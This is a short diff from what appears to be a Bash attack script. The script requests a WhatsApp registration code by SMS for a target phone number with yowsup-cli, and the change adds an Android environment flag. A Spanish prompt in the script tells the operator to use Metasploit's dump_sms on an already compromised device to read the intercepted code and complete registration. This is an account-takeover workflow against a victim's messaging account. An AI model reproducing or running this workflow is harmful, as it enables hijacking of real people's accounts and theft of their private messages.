@@ -160,7 +160,7 @@ if [ "$(id -u)" = "0" ]; then
 				echo " "
 				sleep 3
 
-				sudo yowsup-cli registration --requestcode sms --phone $cc$phone --cc $cc --mcc $mcc --mnc $mnc
+				sudo yowsup-cli registration --requestcode sms --phone $cc$phone --cc $cc --mcc $mcc --mnc $mnc -E android
 
 				echo -e -n "\n$yellowColour-> Desde metasploit aplica el comando dump_sms una vez ganada la sesión | Código (ej: 465-798):$endColour "
 				read codigo_registro
